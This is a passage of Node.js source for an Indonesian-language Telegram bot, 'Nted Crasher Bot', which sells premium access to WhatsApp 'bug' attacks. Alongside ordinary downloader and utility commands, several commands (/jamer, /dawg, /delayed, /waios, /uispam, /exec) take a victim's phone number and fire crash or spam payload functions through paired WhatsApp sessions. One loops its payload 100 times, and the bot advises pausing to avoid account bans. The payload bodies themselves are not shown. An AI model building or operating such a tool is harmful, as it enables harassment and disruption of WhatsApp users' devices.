    return ctx.reply(
`
<blockquote>
N!ted Crasher Bot

Message: This group has become part of premium
</blockquote>
`, { parse_mode: "HTML" });
  }
});
bot.command("delgb", OwnerCheck, (ctx) => {
  let groups = loadPremiumGroups();
  const chatId = Number(ctx.chat.id);

  if (groups.includes(chatId)) {
    groups = groups.filter(id => id !== chatId);
    savePremiumGroups(groups);
    return ctx.reply(
`
<blockquote>
N!ted Crasher Bot

Message: Group sukses di hapus dari daftar premium
</blockquote>
`, { parse_mode: "HTML" });
  } else {
    ctx.reply("ℹ️ Grup ini tidak ada di daftar Premium.");
  }
});

bot.command("addbug", OwnerCheck, (ctx) => {
  let targetId;
  if (ctx.message.reply_to_message) {
    targetId = ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetId = args[1];
  }

  if (!targetId) return ctx.reply("❌ Contoh: /adduser 123456789 atau reply pesan user");

  let users = loadPremiumUsers();
  if (!users.includes(targetId)) {
    users.push(targetId);
    savePremiumUsers(users);
    return ctx.reply(
`
<blockquote>
N!ted Crasher Bot

Message: Sukses menambahkan user tersebut ke dalam anggota premium, kini user tersebut bisa memakai fitur premium
</blockquote>
`, { parse_mode: "HTML" });
  } else {
    ctx.reply("ℹ️ User ini sudah ada di daftar Premium.");
  }
});
bot.command("delbug", OwnerCheck, (ctx) => {
  let targetId;
  if (ctx.message.reply_to_message) {
    targetId = ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetId = args[1];
  }

  if (!targetId) return ctx.reply("❌ Contoh: /deluser 123456789 atau reply pesan user");

  let users = loadPremiumUsers();
  if (users.includes(targetId)) {
    users = users.filter(id => id !== targetId);
    savePremiumUsers(users);
    ctx.reply(`❌ User ${targetId} sudah dihapus dari Premium.`);
  } else {
    ctx.reply("ℹ️ User ini tidak ada di daftar Premium.");
  }
});
bot.command("cekakses", async (ctx) => {
  const groups = loadPremiumGroups();
  const users = loadPremiumUsers();

  const chatId = Number(ctx.chat.id);
  const userId = ctx.from.id.toString();

  if (ctx.chat.type === "group" || ctx.chat.type === "supergroup") {
    if (groups.includes(chatId)) {
      return ctx.reply("✅ Grup ini terdaftar sebagai Premium.");
    } else {
      return ctx.reply("❌ Grup ini belum terdaftar sebagai Premium.");
    }
  }

  const args = ctx.message.text.split(" ");
  let targetId;

  if (ctx.message.reply_to_message) {
    targetId = ctx.message.reply_to_message.from.id.toString();
  } else if (args[1]) {
    targetId = args[1];
  } else {
    targetId = userId;
  }

  if (users.includes(targetId)) {
    return ctx.reply(`✅ User ${targetId} terdaftar sebagai Premium.`);
  } else {
    return ctx.reply(`❌ User ${targetId} belum terdaftar sebagai Premium.`);
  }
});
//##############################
function escapeHTML(text = "") {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}
bot.command("tiktok", async (ctx) => {
  try {
    const args = ctx.message.text.split(" ");
    const link = args[1];

    if (!link) {
      return ctx.reply(
        "❌ Link TikTok tidak ditemukan\n\nContoh:\n/tiktok https://vt.tiktok.com/xxxxx"
      );
    }

    await ctx.reply("⏳ Mengambil video TikTok...");

    const api = `https://tikwm.com/api/?url=${encodeURIComponent(link)}`;
    const { data } = await axios.get(api);

    if (!data || data.code !== 0) {
      return ctx.reply("❌ Gagal mengambil data TikTok");
    }

    const r = data.data;

    const videoUrl = r.play;
    const audioUrl = r.music;

    const username = escapeHTML(r.author?.unique_id || "-");
    const nickname = escapeHTML(r.author?.nickname || "-");

    const views = r.play_count || 0;
    const likes = r.digg_count || 0;
    const comments = r.comment_count || 0;
    const shares = r.share_count || 0;

    const caption = `
<b>🎵 TikTok Downloader</b>

<b>👤 Creator</b>
• Username: @${username}
• Nickname: ${nickname}

<b>📊 Statistics</b>
👁 Views: ${views.toLocaleString()}
❤️ Likes: ${likes.toLocaleString()}
💬 Comments: ${comments.toLocaleString()}
🔁 Shares: ${shares.toLocaleString()}
    `;

    await ctx.replyWithVideo(
      { url: videoUrl },
      {
        caption,
        parse_mode: "HTML",
      }
    );

    await ctx.replyWithAudio(
      { url: audioUrl },
      {
        title: escapeHTML(r.title || "TikTok Audio"),
        performer: nickname,
      }
    );

  } catch (e) {
    console.error(e);
    ctx.reply("❌ Terjadi error saat mengambil TikTok");
  }
});
bot.command("ig", async (ctx) => {
  try {
    const args = ctx.message.text.split(" ")
    if (!args[1]) {
      return ctx.reply(
        "❌ Contoh penggunaan:\n/ig https://www.instagram.com/reel/xxxx"
      )
    }

    const igUrl = args[1]
    await ctx.reply("⏳ Mengambil data reels Instagram...")

    const api = `https://api.ryzendesu.vip/api/downloader/igdl?url=${encodeURIComponent(igUrl)}`
    const res = await fetch(api)
    const json = await res.json()

    if (!json.status || !json.data?.length) {
      return ctx.reply("❌ Gagal mengambil data reels")
    }

    const video = json.data.find(v => v.type === "video") || json.data[0]
    const audio = json.data.find(v => v.type === "audio")

    await ctx.replyWithVideo(
      { url: video.url },
      {
        caption:
`✅ *Reels berhasil diunduh*

📹 Quality: ${video.quality || "default"}
🎵 Sound: ${audio ? "Tersedia" : "Tidak tersedia"}

© Nted Crasher Bot`,
        parse_mode: "Markdown"
      }
    )

    if (audio?.url) {
      await ctx.replyWithAudio(
        { url: audio.url },
        {
          title: "Instagram Reels Audio",
          performer: "Instagram",
          caption: "🎵 Sound dari Reels"
        }
      )
    }

  } catch (err) {
    console.error(err)
    ctx.reply("❌ Terjadi kesalahan saat mengambil reels")
  }
})
bot.command(["kik", "pinterest"], async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ")

  if (!text) {
    return ctx.reply("✨ Contoh:\n/pin michiejkt48")
  }

  try {
    const url = `https://anomali-api.vercel.app/search/pin?q=${encodeURIComponent(text)}`
    console.log("[ANOMALI DEBUG] Fetch:", url)

    const { data } = await axios.get(url)

    if (!data || !data.result || data.result.length === 0) {
      return ctx.reply("❌ Tidak ditemukan hasil.\nCoba kata kunci lain ✨")
    }

    const results = data.result.slice(0, 5)

    for (const img of results) {
      if (!img.image || !img.source) continue

      await ctx.replyWithPhoto(
        img.image,
        {
          caption:
`📌 *Pinterest Result*
✨ Keyword: *${text}*

👤 ${img.fullname || "Unknown"}
👥 ${img.followers || 0} followers`,
          parse_mode: "Markdown",
          ...Markup.inlineKeyboard([
            [
              Markup.button.url("🔎 Lihat Asli", img.source),
              Markup.button.url("⬇️ Download", img.image)
            ]
          ])
        }
      )
    }

  } catch (err) {
    console.error("🛑 [ANOMALI ERROR]", err.message)
    ctx.reply("⚠️ Terjadi kesalahan saat mencari di Pinterest.\nCoba lagi nanti ✨")
  }
});
bot.command('cekid', async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1);
  let targetUser;

  if (args.length === 0) {
    targetUser = ctx.from;
  } else {
    const input = args[0];
    try {
      if (input.startsWith('@')) {
        const member = await ctx.telegram.getChatMember(ctx.chat.id, input.replace('@', ''));
        targetUser = member.user;
      } else {
        const member = await ctx.telegram.getChatMember(ctx.chat.id, parseInt(input));
        targetUser = member.user;
      }
    } catch (err) {
      return ctx.reply('❌ User tidak ditemukan atau bukan member group.');
    }
  }

  const id = targetUser.id;
  const firstName = targetUser.first_name || '';
  const lastName = targetUser.last_name || '';
  const username = targetUser.username ? `@${targetUser.username}` : '-';
  const bio = targetUser.bio || '-';

  const caption = 
`
<blockquote>
─(⚡) Informasi User
UserId: ${id};
Name: ${firstName} ${lastName}
Username: ${username}
Bio: ${bio}
</blockquote>
`;

  try {
    const photos = await ctx.telegram.getUserProfilePhotos(targetUser.id);
    if (photos.total_count > 0) {
      const fileId = photos.photos[0][0].file_id;
      await ctx.replyWithPhoto(fileId, {
        caption,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
               {
                 text: "Copy ID",
                 copy_text: { text: `${id}`
                 }
               }
            ]
          ]
        }
      });
    } else {
      await ctx.reply(caption, {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
               {
                 text: "Copy ID",
                 copy_text: { text: `${id}`
                 }
               }
            ]
          ]
        }
      });
    }
  } catch (err) {
    console.error(err);
    await ctx.reply(caption, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
            [
               {
                 text: "Copy ID",
                 copy_text: { text: `${id}`
                 }
               }
            ]
        ]
      }
    });
  }
});
bot.command('ping', async (ctx) => {
 const os = require('os');
  const start = Date.now();
  const msg = await ctx.reply('⚡ Checking...');
  const latency = Date.now() - start;

  const uptime = process.uptime();
  const memoryUsage = process.memoryUsage();
  const cpuLoad = os.loadavg();

  const text = `
<blockquote>Nted Crasher Bot Latency</blockquote>

⏱ <b>Latency:</b> ${latency} ms
🕒 <b>Uptime:</b> ${Math.floor(uptime)} s
💾 <b>Memory:</b> ${(memoryUsage.heapUsed / 1024 / 1024).toFixed(2)} MB
⚙️ <b>CPU Load:</b> ${cpuLoad.map(v => v.toFixed(2)).join(' | ')}
`;

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    msg.message_id,
    null,
    text,
    {
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [{ text: "ʙᴜʏ ᴍᴜʀʙᴜɢ/sᴄʀɪᴘᴛ", url: "https://t.me/NtedCrasherExec" }]
        ]
      }
    }
  );
});
//##############################
bot.command("jamer", MurbugCheck, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const cmd = ctx.message.text.split(" ")[0];
  const kkk = args[1];

  if (sessions.size === 0)
    return ctx.reply("Sender Kamu Belum Add Silahkan Add Sender.");

  if (!kkk)
    return ctx.reply("❌ Contoh:\n/jamer 628123456789");

  const rawTarget = kkk;

  if (!/^\+?\d{7,15}$/.test(rawTarget)) { return ctx.reply(
`❌ Nomor tidak valid

Contoh:
<code>/jamer 628123456789</code>`,
      { parse_mode: "HTML" }
    );
  }

  const target = rawTarget.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sendMsg = await ctx.replyWithPhoto(
    { url: "https://files.catbox.moe/5eddvu.jpg" },
    {
      caption: `<b>Initializing ${cmd}...</b>`,
      parse_mode: "HTML"
    }
  );

  const msgId = sendMsg.message_id;
 
 await ctx.telegram.editMessageCaption(ctx.chat.id,
  msgId,
  null,
  `
<blockquote>
┏━━「 𝐍𝐎𝐓𝐈𝐅𝐊𝐀𝐒𝐈 𝐁𝐔𝐆 」━━❒
│─□ Target: ${target}
│─□ Status: Proses Send ⏳
│─□ Sender: ${sessions.size}
│─□ Type: ${cmd}
┗━━━━━━━━━━━━━━━❑

© Nted Crasher Bot
</blockquote>
`,
  {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "⌜ Owner ⌟", url: "https://t.me/NtedCrasherExec" }
        ]
      ]
    }
  }
);

  await JamerMutation(target);
  console.log("Jamer Send");
  
  await ctx.telegram.editMessageCaption(ctx.chat.id,
  msgId,
  null,
  `
<blockquote>
┏━━「 𝐍𝐎𝐓𝐈𝐅𝐊𝐀𝐒𝐈 𝐁𝐔𝐆 」━━❒
│─□ Target: ${target}
│─□ Status: Successfully ✅
│─□ Sender: ${sessions.size}
│─□ Type: ${cmd}
┗━━━━━━━━━━━━━━━❑

<b>Note:</b>
<code>⚠️ After the bug, please take a 10 minute break to prevent the number from being banned.</code>
</blockquote>
`,
  {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "⌜ Target ⌟", url: `https://wa.me/${target.split("@") [0]}` }
        ]
      ]
    }
  });
});
bot.command("dawg", requireJoin, AccessCheck, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const cmd = ctx.message.text.split(" ")[0];
  const kkk = args[1];

  if (sessions.size === 0)
    return ctx.reply("Sender Kamu Belum Add Silahkan Add Sender.");

  if (!kkk)
    return ctx.reply(`❌ Contoh:\n${cmd} 628123456789`);

  const rawTarget = kkk;

  if (!/^\+?\d{7,15}$/.test(rawTarget)) { return ctx.reply(
`❌ Nomor tidak valid

Contoh:
<code>${cmd} 628123456789</code>`,
      { parse_mode: "HTML" }
    );
  }

  const target = rawTarget.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sendMsg = await ctx.replyWithPhoto(
    { url: "https://files.catbox.moe/5eddvu.jpg" },
    {
      caption: `<b>Initializing ${cmd}...</b>`,
      parse_mode: "HTML"
    }
  );

  const msgId = sendMsg.message_id;

  await ctx.telegram.editMessageCaption(ctx.chat.id,
  msgId,
  null,
  `
<blockquote>
┏━━「 𝐍𝐎𝐓𝐈𝐅𝐊𝐀𝐒𝐈 𝐁𝐔𝐆 」━━❒
│─□ Target: ${target}
│─□ Status: Proses Send ⏳
│─□ Sender: ${sessions.size}
│─□ Type: ${cmd}
┗━━━━━━━━━━━━━━━❑

© Nted Crasher Bot
</blockquote>
`,
  {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "⌜ Owner ⌟", url: "https://t.me/NtedCrasherExec" }
        ]
      ]
    }
  }
);

    await DawgSpam(target);
    console.log(chalk.green(`Successful Send Bug Type: ${cmd}`));

  await ctx.telegram.editMessageCaption(ctx.chat.id,
  msgId,
  null,
  `
<blockquote>
┏━━「 𝐍𝐎𝐓𝐈𝐅𝐊𝐀𝐒𝐈 𝐁𝐔𝐆 」━━❒
│─□ Target: ${target}
│─□ Status: Successfully ✅
│─□ Sender: ${sessions.size}
│─□ Type: ${cmd}
┗━━━━━━━━━━━━━━━❑

<b>Note:</b>
<code>⚠️ After the bug, please take a 10 minute break to prevent the number from being banned.</code>
</blockquote>
`,
  {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "⌜ Target ⌟", url: `https://wa.me/${target.split("@") [0]}` }
        ]
      ]
    }
  });
});
bot.command("delayed", requireJoin, AccessCheck, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const cmd = ctx.message.text.split(" ")[0];
  const kkk = args[1];

  if (sessions.size === 0)
    return ctx.reply("Sender Kamu Belum Add Silahkan Add Sender.");

  if (!kkk)
    return ctx.reply(`❌ Contoh:\n${cmd} 628123456789`);

  const rawTarget = kkk;

  if (!/^\+?\d{7,15}$/.test(rawTarget)) { return ctx.reply(
`❌ Nomor tidak valid

Contoh:
<code>${cmd} 628123456789</code>`,
      { parse_mode: "HTML" }
    );
  }

  const target = rawTarget.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sendMsg = await ctx.replyWithPhoto(
    { url: "https://files.catbox.moe/5eddvu.jpg" },
    {
      caption: `<b>Initializing ${cmd}...</b>`,
      parse_mode: "HTML"
    }
  );

  const msgId = sendMsg.message_id;

  await ctx.telegram.editMessageCaption(ctx.chat.id,
  msgId,
  null,
  `
<blockquote>
┏━━「 𝐍𝐎𝐓𝐈𝐅𝐊𝐀𝐒𝐈 𝐁𝐔𝐆 」━━❒
│─□ Target: ${target}
│─□ Status: Proses Send ⏳
│─□ Sender: ${sessions.size}
│─□ Type: ${cmd}
┗━━━━━━━━━━━━━━━❑

© Nted Crasher Bot
</blockquote>
`,
  {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "⌜ Owner ⌟", url: "https://t.me/NtedCrasherExec" }
        ]
      ]
    }
  }
);

    await DelayMurbug(target);
    console.log(chalk.green(`Successful Send Bug Type: ${cmd}`));

  await ctx.telegram.editMessageCaption(ctx.chat.id,
  msgId,
  null,
  `
<blockquote>
┏━━「 𝐍𝐎𝐓𝐈𝐅𝐊𝐀𝐒𝐈 𝐁𝐔𝐆 」━━❒
│─□ Target: ${target}
│─□ Status: Successfully ✅
│─□ Sender: ${sessions.size}
│─□ Type: ${cmd}
┗━━━━━━━━━━━━━━━❑

<b>Note:</b>
<code>⚠️ After the bug, please take a 10 minute break to prevent the number from being banned.</code>
</blockquote>
`,
  {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "⌜ Target ⌟", url: `https://wa.me/${target.split("@") [0]}` }
        ]
      ]
    }
  });
});
bot.command("waios", MurbugCheck, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const cmd = ctx.message.text.split(" ")[0];
  const kkk = args[1];

  if (sessions.size === 0)
    return ctx.reply("Sender Kamu Belum Add Silahkan Add Sender.");

  if (!kkk)
    return ctx.reply(`❌ Contoh:\n${cmd} 628123456789`);

  const rawTarget = kkk;

  if (!/^\+?\d{7,15}$/.test(rawTarget)) { return ctx.reply(
`❌ Nomor tidak valid

Contoh:
<code>${cmd} 628123456789</code>`,
      { parse_mode: "HTML" }
    );
  }

  const target = rawTarget.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sendMsg = await ctx.replyWithPhoto(
    { url: "https://files.catbox.moe/5eddvu.jpg" },
    {
      caption: `<b>Initializing ${cmd}...</b>`,
      parse_mode: "HTML"
    }
  );

  const msgId = sendMsg.message_id;

  await ctx.telegram.editMessageCaption(ctx.chat.id,
  msgId,
  null,
  `
<blockquote>
┏━━「 𝐍𝐎𝐓𝐈𝐅𝐊𝐀𝐒𝐈 𝐁𝐔𝐆 」━━❒
│─□ Target: ${target}
│─□ Status: Proses Send ⏳
│─□ Sender: ${sessions.size}
│─□ Type: ${cmd}
┗━━━━━━━━━━━━━━━❑

© Nted Crasher Bot
</blockquote>
`,
  {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "⌜ Owner ⌟", url: "https://t.me/NtedCrasherExec" }
        ]
      ]
    }
  }
);

  for (let i = 0; i < 100; i++) {
    await IosBag(target);
    console.log(chalk.green(`Successful Send Bug Type: ${cmd}`));
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id,
  msgId,
  null,
  `
<blockquote>
┏━━「 𝐍𝐎𝐓𝐈𝐅𝐊𝐀𝐒𝐈 𝐁𝐔𝐆 」━━❒
│─□ Target: ${target}
│─□ Status: Successfully ✅
│─□ Sender: ${sessions.size}
│─□ Type: ${cmd}
┗━━━━━━━━━━━━━━━❑

<b>Note:</b>
<code>⚠️ After the bug, please take a 10 minute break to prevent the number from being banned.</code>
</blockquote>
`,
  {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "⌜ Target ⌟", url: `https://wa.me/${target.split("@") [0]}` }
        ]
      ]
    }
  });
});
bot.command("uispam", AccessCheck, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const cmd = ctx.message.text.split(" ")[0];
  const kkk = args[1];

  if (sessions.size === 0)
    return ctx.reply("Sender Kamu Belum Add Silahkan Add Sender.");

  if (!kkk)
    return ctx.reply(`❌ Contoh:\n${cmd} 628123456789`);

  const rawTarget = kkk;

  if (!/^\+?\d{7,15}$/.test(rawTarget)) { return ctx.reply(
`❌ Nomor tidak valid

Contoh:
<code>${cmd} 628123456789</code>`,
      { parse_mode: "HTML" }
    );
  }

  const target = rawTarget.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sendMsg = await ctx.replyWithPhoto(
    { url: "https://files.catbox.moe/5eddvu.jpg" },
    {
      caption: `<b>Initializing ${cmd}...</b>`,
      parse_mode: "HTML"
    }
  );

  const msgId = sendMsg.message_id;

  await ctx.telegram.editMessageCaption(ctx.chat.id,
  msgId,
  null,
  `
<blockquote>
┏━━「 𝐍𝐎𝐓𝐈𝐅𝐊𝐀𝐒𝐈 𝐁𝐔𝐆 」━━❒
│─□ Target: ${target}
│─□ Status: Proses Send ⏳
│─□ Sender: ${sessions.size}
│─□ Type: ${cmd}
┗━━━━━━━━━━━━━━━❑

© Nted Crasher Bot
</blockquote>
`,
  {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "⌜ Owner ⌟", url: "https://t.me/NtedCrasherExec" }
        ]
      ]
    }
  }
);

    await UiSpamHingga(target);
    console.log(chalk.green(`Successful Send Bug Type: ${cmd}`));

  await ctx.telegram.editMessageCaption(ctx.chat.id,
  msgId,
  null,
  `
<blockquote>
┏━━「 𝐍𝐎𝐓𝐈𝐅𝐊𝐀𝐒𝐈 𝐁𝐔𝐆 」━━❒
│─□ Target: ${target}
│─□ Status: Successfully ✅
│─□ Sender: ${sessions.size}
│─□ Type: ${cmd}
┗━━━━━━━━━━━━━━━❑

<b>Note:</b>
<code>⚠️ After the bug, please take a 10 minute break to prevent the number from being banned.</code>
</blockquote>
`,
  {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "⌜ Target ⌟", url: `https://wa.me/${target.split("@") [0]}` }
        ]
      ]
    }
  });
});
bot.command("exec", AccessCheck, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const cmd = ctx.message.text.split(" ")[0];
  const kkk = args[1];

  if (sessions.size === 0)
    return ctx.reply("Sender Kamu Belum Add Silahkan Add Sender.");

  if (!kkk)
    return ctx.reply(`❌ Contoh:\n${cmd} 628123456789`);

  const rawTarget = kkk;

  if (!/^\+?\d{7,15}$/.test(rawTarget)) { return ctx.reply(
`❌ Nomor tidak valid

Contoh:
<code>${cmd} 628123456789</code>`,
      { parse_mode: "HTML" }
    );
  }

  const target = rawTarget.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sendMsg = await ctx.replyWithPhoto(
    { url: "https://files.catbox.moe/5eddvu.jpg" },
    {
      caption: `<b>Initializing ${cmd}...</b>`,
      parse_mode: "HTML"
    }
  );

  const msgId = sendMsg.message_id;

  await ctx.telegram.editMessageCaption(ctx.chat.id,
  msgId,
  null,
  `
<blockquote>
┏━━「 𝐍𝐎𝐓𝐈𝐅𝐊𝐀𝐒𝐈 𝐁𝐔𝐆 」━━❒
│─□ Target: ${target}
│─□ Status: Proses Send ⏳
│─□ Sender: ${sessions.size}
│─□ Type: ${cmd}
┗━━━━━━━━━━━━━━━❑

© Nted Crasher Bot
</blockquote>
`,
  {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "⌜ Owner ⌟", url: "https://t.me/NtedCrasherExec" }
        ]
      ]
    }
  }
);

    await UiExec(target);
    console.log(chalk.green(`Successful Send Bug Type: ${cmd}`));

  await ctx.telegram.editMessageCaption(ctx.chat.id,
  msgId,
  null,
  `
<blockquote>
┏━━「 𝐍𝐎𝐓𝐈𝐅𝐊𝐀𝐒𝐈 𝐁𝐔𝐆 」━━❒
│─□ Target: ${target}
│─□ Status: Successfully ✅
│─□ Sender: ${sessions.size}
│─□ Type: ${cmd}
┗━━━━━━━━━━━━━━━❑

<b>Note:</b>
<code>⚠️ After the bug, please take a 10 minute break to prevent the number from being banned.</code>
</blockquote>
`,
  {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "⌜ Target ⌟", url: `https://wa.me/${target.split("@") [0]}` }
        ]
      ]
    }
  });
});
//##############################
bot.command("addno", async (ctx) => {
const args = ctx.message.text.split(" ");
 if (args.length < 2) { return await ctx.reply(`
<blockquote>Bot pairing status</blockquote>
example: /addno 62xxxx`, { parse_mode: "HTML" });
}

  const BotNumber = args[1];
   await ctx.reply(`⏳ Memulai pairing ke nomor ${BotNumber}...`);
    await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});
    
bot.command("listno", OwnerCheck, async (ctx) => {
   if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");
const list = [...sessions.keys()].map(n => `• ${n}`).join("\n");
ctx.reply(`*Daftar Sender Aktif:*\n${list}`, { parse_mode: "Markdown" });
});

 bot.command("delno", OwnerCheck, async (ctx) => {
                  const args = ctx.message.text.split(" ");
                  if (args.length < 2) return ctx.reply("Contoh: /delsender 628xxxx");

                  const number = args[1];
                  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

                  try {
                  const sessionDir = sessionPath(number);
                  sessions.get(number).end(); 
                  sessions.delete(number);
                  fs.rmSync(sessionDir, { recursive: true, force: true });

                  const data = JSON.parse(fs.readFileSync(file_session));
                  const updated = data.filter(n => n !== number);
                  fs.writeFileSync(file_session, JSON.stringify(updated));

                  ctx.reply(`Sender ${number} berhasil dihapus.`);
                  } catch (err) {
                  console.error(err);
 
                  }
                  });
//##############################
bot.command('tourl', async (ctx) => {
  const repliedMsg = ctx.message.reply_to_message;

  if (!repliedMsg || (!repliedMsg.document && !repliedMsg.photo && !repliedMsg.video)) {
    return ctx.reply("❌ Silakan reply sebuah file/foto/video dengan command /tourl");
  }

  let fileId, fileName;

  if (repliedMsg.document) {
    fileId = repliedMsg.document.file_id;
    fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
  } else if (repliedMsg.photo) {
    const photos = repliedMsg.photo;
    fileId = photos[photos.length - 1].file_id; 
    fileName = `photo_${Date.now()}.jpg`;
  } else if (repliedMsg.video) {
    fileId = repliedMsg.video.file_id;
    fileName = `video_${Date.now()}.mp4`;
  }

  try {
    const processingMsg = await ctx.reply(`⏳ ᴍᴇɴɢᴜᴘʟᴏᴀᴅ ᴋᴇ ᴄᴀᴛʙᴏx...`, { reply_to_message_id: ctx.message.message_id });

    const file = await ctx.telegram.getFile(fileId);
    const fileLink = `https://api.telegram.org/file/bot${Token}/${file.file_path}`;

    const fileResponse = await axios.get(fileLink, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(fileResponse.data);

    // Upload ke Catbox
    const form = new FormData();
    form.append('reqtype', 'fileupload');
    form.append('fileToUpload', buffer, {
      filename: fileName,
      contentType: fileResponse.headers['content-type'],
    });

    const { data: catboxUrl } = await axios.post('https://catbox.moe/user/api.php', form, {
      headers: form.getHeaders()
    });

    if (!catboxUrl.startsWith('https://')) {
      throw new Error('Catbox tidak mengembalikan URL yang valid');
    }

    await ctx.telegram.editMessageText(ctx.chat.id, processingMsg.message_id, null,
      `✅ ᴜᴘʟᴏᴀᴅ ʙᴇʀʜᴀꜱɪʟ!\n\n📎 URL: \`${catboxUrl}\``,
      { parse_mode: "Markdown" }
    );

  } catch (error) {
    console.error("Upload error:", error?.response?.data || error.message);
    ctx.reply("❌ Gagal mengupload file ke Catbox");
  }
});
bot.command('iqc', async (ctx) => {
  const text = ctx.message.text.replace('/iqc', '').trim();

  if (!text) {
    return ctx.reply('❌ Format Salah: /iqc jam|batre|carrier|pesan\nContoh: /iqc 18:00|40|Indosat|hai hai', {
      reply_to_message_id: ctx.message.message_id
    });
  }

  const parts = text.split('|');
  if (parts.length < 4) {
    return ctx.reply('❌ Format salah! Gunakan:\n/iqc jam|batre|carrier|pesan\nContoh:\n/iqc 18:00|40|Indosat|hai hai', {
      reply_to_message_id: ctx.message.message_id
    });
  }

  const time = parts[0].trim();
  const battery = parts[1].trim();
  const carrier = parts[2].trim();
  const messageParts = parts.slice(3);
  const messageText = messageParts.join('|').trim();

  if (!time || !battery || !carrier || !messageText) {
    return ctx.reply('⚠️ Format salah! Pastikan semua field terisi:\n/iqc jam|batre|carrier|pesan', {
      reply_to_message_id: ctx.message.message_id
    });
  }

  const waitingMsg = await ctx.reply('⏳', { reply_to_message_id: ctx.message.message_id });

  try {
    const encodedTime = encodeURIComponent(time);
    const encodedCarrier = encodeURIComponent(carrier);
    const encodedMessage = encodeURIComponent(messageText);

    const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodedTime}&batteryPercentage=${battery}&carrierName=${encodedCarrier}&messageText=${encodedMessage}&emojiStyle=apple`;

    const response = await fetch(url);

    if (!response.ok) {
      throw new Error(`API returned status ${response.status}`);
    }

    const arrayBuffer = await response.arrayBuffer();
    const buffer = Buffer.from(arrayBuffer);

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ *ꜱᴜᴋꜱᴇꜱ ʙᴀɴɢ*`,
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });

    await ctx.deleteMessage(waitingMsg.message_id);

  } catch (error) {
    console.error('Error:', error);

    await ctx.deleteMessage(waitingMsg.message_id);

    await ctx.reply('❌ Terjadi kesalahan, Coba lagi!', {
      reply_to_message_id: ctx.message.message_id
    });
  }
});
bot.command("prem", async (ctx) => {
  const replyMsg = ctx.message.reply_to_message;

  if (!replyMsg) {
    return ctx.reply("❌ Harus reply ke emoji premium dulu.");
  }

  if (replyMsg.entities) {
    for (const entity of replyMsg.entities) {
      if (entity.type === "custom_emoji") {
        const emojiId = entity.custom_emoji_id;
        return ctx.reply(`✅ ID emoji premium: \`${emojiId}\``);
      }
    }
  }

  return ctx.reply("❌ Tidak ada emoji premium di pesan yang direply.");
});
bot.command("updatesc", OwnerCheck, async (ctx) => {
  try {
    const { data } = await axios.get(VERSION_URL);
    const latestVersion = data.version;
    const fileUrl = `https://raw.githubusercontent.com/${GH_USER}/${GH_REPO}/${BRANCH}/${data.url}`;

    if (latestVersion !== currentVersion) {
      await ctx.replyWithPhoto(ImgUrl, {
      caption: `
<blockquote>
✘ Sekarang anda pake versi ]${currentVersion}] sudah lama, Versi update terbaru adalah ${latestVersion}
</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "̊⌜ ᴄʜᴀɴɴᴇʟ ᴜᴘᴅᴀᴛᴇ ⌟", 
              url: "https://t.me/TceSupportID", 
              style: "primary",
              icon_custom_emoji_id: "4956371914323920049"
           },
          ]
        ]
      }
    });
      await doUpdate(ctx, latestVersion, fileUrl);
    } else {
      await ctx.reply("Script anda sudah memakai yang terbaru, tidak bisa update lagi");
    }
  } catch (err) {
    ctx.reply("❌ Gagal fullupdate: " + err.message);
  }
});
bot.command("cekversi", OwnerCheck, async (ctx) => {
  try {
    const { data } = await axios.get(VERSION_URL);
    const latestVersion = data.version;

    if (latestVersion !== currentVersion) {
      await ctx.replyWithPhoto(ImgUrl, {
      caption: `
<blockquote>
✘ Versi Lama: ${currentVersion}
✘ Versi Terbaru: ${latestVersion}

⨳ Gunakan command: /updatesc untuk update ke versi yang lebih terbaru
</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
